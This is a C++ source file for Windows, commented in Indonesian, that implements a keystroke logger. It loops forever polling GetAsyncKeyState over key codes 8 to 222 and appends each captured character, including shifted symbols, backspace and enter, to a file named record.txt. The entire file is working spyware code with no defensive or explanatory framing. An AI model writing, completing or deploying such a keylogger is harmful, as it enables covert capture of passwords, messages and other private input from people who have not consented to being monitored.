#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

void log();
int main() {
    log();
    return 0;
}

void log(){
    char key;

    while (true){ //endless loop
        for (key = 8; key <= 222; key++){
            if (GetAsyncKeyState(key) == -32767){
                ofstream  write ("record.txt", ios::app);

                if (((key > 64) && (key < 91)) && !(GetAsyncKeyState(0x10))) { //jika menekan huruf tanpa shift
                    key += 32; //ubah menjadi huruf kecil (sesuai dengan urutan ASCII)
                    write << key;
                    write.close();
                    break;

                } else if ((key > 64) && (key < 91)){ //jika menekan huruf dan shift
                    write << key;
                    write.close();
                    break;

                } else {
                    switch (key) {

                        case 8: //jika menekan BACKSPACE
                            write << "<-";
                            break;

                        case 13: //jika menekan ENTER
                            write << endl;
                            break;

                        case 32: //jika menekan SPASI
                            write << " ";
                            break;

                        case 48: //jika menekan angka 0
                            if (GetAsyncKeyState(0x10)){ //dan juga menekan shift
                                write << ")"; //tulis karakter ")"
                                break;

                            } else { //jika tidak menekan shift
                                write << key; //tulis angka saja
                                break;
                            }

                        case 49: //jika menekan angka 1
                            if (GetAsyncKeyState(0x10)){
                                write << "!";
                                break;

                            } else {
                                write << key;
                                break;
                            }

                        case 50: //jika menekan angka 2
                            if (GetAsyncKeyState(0x10)){
                                write << "@";
                                break;

                            } else {
                                write << key;
                                break;
                            }

                        case 51: //jika menekan angka 3
                            if (GetAsyncKeyState(0x10)){
                                write << "#";
                                break;

                            } else {
                                write << key;
                                break;
                            }

                        case 52: //jika menekan angka 4
                            if (GetAsyncKeyState(0x10)){
                                write << "$";
                                break;

                            } else {
                                write << key;
                                break;
                            }

                        case 53: //jika menekan angka 5
                            if (GetAsyncKeyState(0x10)){
                                write << "%";
                                break;

                            } else {
                                write << key;
                                break;
                            }

                        case 54: //jika menekan angka 6
                            if (GetAsyncKeyState(0x10)){
                                write << "^";
                                break;

                            } else {
                                write << key;
                                break;
                            }

                        case 55: //jika menekan angka 7
                            if (GetAsyncKeyState(0x10)){
                                write << "&";
                                break;

                            } else {
                                write << key;
                                break;
                            }

                        case 56: //jika menekan angka 8
                            if (GetAsyncKeyState(0x10)){
                                write << "*";
                                break;

                            } else {
                                write << key;
                                break;
                            }

                        case 57: //jika menekan angka 9
                            if (GetAsyncKeyState(0x10)){
                                write << "(";
                                break;

                            } else {
                                write << key;
                                break;
                            }
                    }
                }
            }
        }
    }
}